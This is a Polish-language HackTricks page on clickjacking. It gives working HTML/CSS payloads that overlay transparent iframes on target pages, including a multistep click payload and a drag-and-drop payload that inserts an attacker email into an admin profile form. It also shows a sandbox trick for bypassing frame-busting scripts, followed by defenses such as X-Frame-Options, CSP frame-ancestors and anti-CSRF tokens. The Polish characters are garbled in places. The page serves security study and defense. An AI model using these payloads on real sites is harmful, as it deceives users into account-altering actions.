# Clickjacking

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do atwego tworzenia i **automatyzacji prac** z wykorzystaniem najbardziej **zaawansowanych narzdzi spoecznociowych** na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Co to jest Clickjacking

W ataku clickjacking **u偶ytkownik** jest **oszukany**, aby **klikn** w **element** na stronie internetowej, kt贸ry jest albo **niewidoczny** albo przebrany za inny element. Ta manipulacja mo偶e prowadzi do niezamierzonych konsekwencji dla u偶ytkownika, takich jak pobieranie zoliwego oprogramowania, przekierowanie na zoliwe strony internetowe, podanie powiadcze dostpu lub poufnych informacji, transfery pieni偶ne lub zakupy online.

### Sztuczka z wypenianiem formularzy

Czasami mo偶liwe jest **wypenienie wartoci p贸l formularza za pomoc parametr贸w GET podczas adowania strony**. Atakujcy mo偶e wykorzysta to zachowanie, aby wypeni formularz dowolnymi danymi i wysa adunek clickjackingowy, aby u偶ytkownik nacisn przycisk Wylij.

### Wypenij formularz za pomoc przecignij i upu

Jeli potrzebujesz, aby u偶ytkownik **wypeni formularz**, ale nie chcesz bezporednio prosi go o wpisanie okrelonych informacji (np. adresu e-mail i/lub konkretnego hasa, kt贸re znasz), mo偶esz poprosi go o **przecignicie i upuszczenie** czego, co wpisze Twoje kontrolowane dane, jak w [**tym przykadzie**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Podstawowy adunek
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy adunek
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Przecignij i upu + Kliknij adunek
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Jeli zidentyfikowano atak **XSS, kt贸ry wymaga kliknicia** przez u偶ytkownika w pewny element w celu **wywoania** XSS, a strona jest **podatna na clickjacking**, mo偶na to wykorzysta, aby oszuka u偶ytkownika i zmusi go do kliknicia przycisku/linku.\
Przykad:\
_Znaleziono **self XSS** w prywatnych danych konta (dane, kt贸re **tylko ty mo偶esz ustawi i odczyta**). Strona z **formularzem** do ustawienia tych danych jest **podatna** na **Clickjacking**, a mo偶na **wstpnie wypeni formularz** za pomoc parametr贸w GET._\
\_\_Atakujcy m贸gby przygotowa atak **Clickjacking** na t stron, **wstpnie wypeniajc** formularz **payloadem XSS** i **oszukujc** u偶ytkownika, aby **zatwierdzi** formularz. Tak wic, **gdy formularz zostanie przesany** i wartoci zostan zmodyfikowane, **u偶ytkownik wykona XSS**.

## Strategie agodzenia Clickjacking

### Obrona po stronie klienta

Skrypty wykonywane po stronie klienta mog podejmowa dziaania w celu zapobie偶enia Clickjacking:

* Upewnienie si, 偶e okno aplikacji jest g贸wnym lub najwy偶szym oknem.
* Sprawienie, 偶e wszystkie ramki s widoczne.
* Zapobieganie klikniciom w niewidoczne ramki.
* Wykrywanie i informowanie u偶ytkownik贸w o potencjalnych pr贸bach Clickjacking.

Jednak te skrypty amice ramki mog zosta obejcia:

* **Ustawienia bezpieczestwa przegldarek:** Niekt贸re przegldarki mog blokowa te skrypty na podstawie swoich ustawie bezpieczestwa lub braku obsugi JavaScript.
* **Atrybut HTML5 iframe `sandbox`:** Atakujcy mo偶e zneutralizowa skrypty amice ramki, ustawiajc atrybut `sandbox` z wartociami `allow-forms` lub `allow-scripts` bez `allow-top-navigation`. Zapobiega to ramce weryfikacji, czy jest najwy偶szym oknem, np.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### Obrona po stronie serwera

#### X-Frame-Options

Nag贸wek odpowiedzi HTTP **`X-Frame-Options`** informuje przegldarki o legalnoci renderowania strony w elemencie `<frame>` lub `<iframe>`, pomagajc w zapobieganiu Clickjackingowi:

- `X-Frame-Options: deny` - 呕adna domena nie mo偶e osadza zawartoci.
- `X-Frame-Options: sameorigin` - Tylko bie偶ca witryna mo偶e osadza zawarto.
- `X-Frame-Options: allow-from https://trusted.com` - Tylko okrelony 'uri' mo偶e osadza stron.
- Nale偶y zauwa偶y ograniczenia: jeli przegldarka nie obsuguje tej dyrektywy, mo偶e nie dziaa. Niekt贸re przegldarki preferuj dyrektyw CSP frame-ancestors.

#### Dyrektywa frame-ancestors w polityce bezpieczestwa zawartoci (CSP)

**Dyrektywa `frame-ancestors` w CSP** jest zalecan metod ochrony przed Clickjackingiem:

- `frame-ancestors 'none'` - Podobne do `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Podobne do `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Podobne do `X-Frame-Options: allow-from`.

Na przykad, poni偶sza CSP zezwala tylko na osadzanie z tej samej domeny:

`Content-Security-Policy: frame-ancestors 'self';`

Szczeg贸owe informacje i przykady zastosowa mo偶na znale藕 w [dokumentacji CSP dotyczcej frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) oraz [dokumentacji Mozilla CSP dotyczcej frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Polityka bezpieczestwa zawartoci (CSP) z `child-src` i `frame-src`

**Polityka bezpieczestwa zawartoci (CSP)** to rodek bezpieczestwa, kt贸ry pomaga w zapobieganiu Clickjackingowi i innym atakom wstrzykiwania kodu, okrelajc, kt贸re 藕r贸da przegldarka powinna zezwoli na adowanie zawartoci.

#### Dyrektywa `frame-src`

- Okrela prawidowe 藕r贸da dla ramek.
- Jest bardziej szczeg贸owa ni偶 dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki z tego samego pochodzenia (self) oraz https://trusted-website.com.

#### Dyrektywa `child-src`

* Wprowadzona w poziomie CSP 2 w celu ustawienia prawidowych 藕r贸de dla worker贸w sieciowych i ramek.
* Dziaa jako opcja zapasowa dla frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki i workery z tego samego pochodzenia (self) oraz https://trusted-website.com.

**Uwagi dotyczce u偶ycia:**

* Dezaprobaty: child-src jest stopniowo eliminowany na rzecz frame-src i worker-src.
* Zachowanie zapasowe: Jeli frame-src jest nieobecny, child-src jest u偶ywany jako zapasowy dla ramek. Jeli oba s nieobecne, u偶ywane jest default-src.
* cisa definicja 藕r贸da: W dyrektywach nale偶y uwzgldni tylko zaufane 藕r贸da, aby zapobiec eksploatacji.

#### Skrypty JavaScript amice ramki

Cho nie s cakowicie niezawodne, skrypty amice ramki oparte na JavaScript mog by u偶ywane do zapobiegania osadzaniu strony internetowej w ramce. Przykad:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Wykorzystanie token贸w Anti-CSRF

* **Walidacja token贸w:** U偶ywaj token贸w anti-CSRF w aplikacjach internetowych, aby upewni si, 偶e 偶dania zmieniajce stan s dokonywane celowo przez u偶ytkownika, a nie poprzez stron podatn na Clickjacking.

## Referencje

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa workflowy** zasilane przez najbardziej zaawansowane narzdzia spoecznociowe na wiecie.\
Zdobd藕 dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
